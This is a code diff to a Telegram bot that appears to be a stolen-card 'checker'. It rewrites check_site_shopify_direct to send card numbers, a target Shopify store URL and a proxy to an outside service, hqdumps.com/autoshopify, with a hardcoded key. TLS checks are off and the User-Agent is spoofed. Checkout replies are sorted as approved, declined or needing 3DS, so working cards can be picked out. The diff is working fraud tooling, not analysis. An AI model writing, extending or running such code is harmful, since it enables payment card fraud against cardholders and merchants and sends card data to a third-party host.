@@ -13,7 +13,6 @@ import user_agent
 import gates
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from telebot import types
-import autosh
 
 OWNER_ID = [5963548505, 1614278744]
 USER_PROXIES_FILE = "user_proxies.json"
@@ -165,40 +164,98 @@ def validate_proxies_strict(proxies, bot, message):
     return live_proxies
 
 # ============================================================================
-# 🔧 WRAPPER FOR SHOPIFY (using autosh)
+# 🔧 NEW SHOPIFY CHECKER USING EXTERNAL API
 # ============================================================================
 def check_site_shopify_direct(site_url, cc, proxy=None):
+    """
+    Checks a Shopify site using the hqdumps.com API.
+    Returns a dictionary with 'Response', 'status', 'gateway', 'price', 'message'.
+    """
     try:
-        result_json = autosh.ShopProcessor().process(cc, site_url, proxy)
-        result = json.loads(result_json)
-        response_text = result.get('Response', 'Unknown')
-        price = result.get('Price', '0.00')
-        gateway = result.get('Gateway', 'Shopify Full Flow')
-
+        # --- Clean and prepare parameters ---
+        site_url = site_url.rstrip('/')
+        
+        # Format proxy for the API (expects host:port:username:password)
+        api_proxy = ""
+        if proxy:
+            proxy = proxy.strip()
+            parts = proxy.split(':')
+            if len(parts) == 4:
+                api_proxy = proxy
+            elif len(parts) == 2:
+                api_proxy = proxy
+            elif '@' in proxy:
+                match = re.match(r'(?:http://)?([^:]+):([^@]+)@([^:]+):(\d+)', proxy)
+                if match:
+                    user, password, host, port = match.groups()
+                    api_proxy = f"{host}:{port}:{user}:{password}"
+        
+        import urllib.parse
+        encoded_cc = urllib.parse.quote(cc)
+        
+        # --- Build the API URL ---
+        api_key = "techshopify"
+        api_url = (
+            f"https://hqdumps.com/autoshopify/index.php"
+            f"?key={api_key}"
+            f"&url={site_url}"
+            f"&proxy={api_proxy}"
+            f"&cc={encoded_cc}"
+        )
+        
+        # --- Make the API request ---
+        session = requests.Session()
+        session.verify = False
+        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
+        response = session.get(api_url, headers=headers, timeout=30)
+        
+        if response.status_code != 200:
+            return {
+                'Response': f"API HTTP Error: {response.status_code}",
+                'status': 'ERROR',
+                'gateway': 'Shopify API',
+                'price': '0.00',
+                'message': f"HTTP {response.status_code}"
+            }
+        
+        # --- Parse the JSON response ---
+        try:
+            data = response.json()
+        except:
+            return {
+                'Response': "Invalid API response (not JSON)",
+                'status': 'ERROR',
+                'gateway': 'Shopify API',
+                'price': '0.00',
+                'message': response.text[:200]
+            }
+        
+        response_text = data.get('Response', 'Unknown')
+        price = data.get('Price', '0.00')
+        gateway = data.get('Gate', 'Shopify API')
+        
         response_upper = response_text.upper()
-        if 'THANK YOU FOR YOUR PURCHASE' in response_upper or 'ORDER PLACED' in response_upper:
+        
+        # Determine status based on response text
+        if 'THANK YOU' in response_upper or 'ORDER PLACED' in response_upper or 'CONFIRMED' in response_upper:
             status = 'APPROVED'
-        elif 'INCORRECT_ZIP' in response_upper:
+        elif 'DECLINED' in response_upper or 'CARD DECLINED' in response_upper:
             status = 'DECLINED'
-        elif 'INSUFFICIENT_FUNDS' in response_upper:
+        elif 'INSUFFICIENT FUNDS' in response_upper:
             status = 'DECLINED'
-        elif 'INCORRECT_CVC' in response_upper:
+        elif 'INCORRECT CVC' in response_upper or 'INCORRECT_CVC' in response_upper:
+            status = 'DECLINED'
+        elif 'INCORRECT ZIP' in response_upper or 'INCORRECT_ZIP' in response_upper:
             status = 'DECLINED'
         elif '3DS' in response_upper or 'ACTION_REQUIRED' in response_upper:
             status = 'APPROVED_OTP'
-        elif 'CAPTCHA' in response_upper:
+        elif 'PROXY' in response_upper or 'TIMEOUT' in response_upper:
             status = 'ERROR'
-        elif 'NO_PAYMENT_ID' in response_upper:
-            status = 'DECLINED'
-        elif 'TOKENIZATION FAILED' in response_upper:
+        elif 'INVALID PROXY' in response_upper:
             status = 'ERROR'
         else:
-            decline_keywords = ['DECLINED', 'CARD DECLINED', 'EXPIRED', 'FRAUD', 'DO NOT HONOR']
-            if any(k in response_upper for k in decline_keywords):
-                status = 'DECLINED'
-            else:
-                status = 'UNKNOWN'
-
+            status = 'UNKNOWN'
+        
         return {
             'Response': response_text,
             'status': status,
@@ -206,15 +263,31 @@ def check_site_shopify_direct(site_url, cc, proxy=None):
             'price': price,
             'message': response_text
         }
+        
+    except requests.exceptions.Timeout:
+        return {
+            'Response': 'API Timeout',
+            'status': 'ERROR',
+            'gateway': 'Shopify API',
+            'price': '0.00',
+            'message': 'Request timed out'
+        }
+    except requests.exceptions.ConnectionError:
+        return {
+            'Response': 'Connection Error',
+            'status': 'ERROR',
+            'gateway': 'Shopify API',
+            'price': '0.00',
+            'message': 'Failed to connect to API'
+        }
     except Exception as e:
         return {
             'Response': f'Error: {str(e)}',
             'status': 'ERROR',
-            'gateway': 'Shopify Full Flow',
+            'gateway': 'Shopify API',
             'price': '0.00',
             'message': str(e)
         }
-
 # ============================================================================
 # 🚀 MAIN HANDLER SETUP
 # ============================================================================
@@ -1076,3 +1149,4 @@ def setup_complete_handler(bot, get_filtered_sites_func, proxies_data,
             bot.edit_message_text(msg, chat_id, mid, parse_mode='HTML')
         except:
             bot.send_message(chat_id, msg, parse_mode='HTML')
+
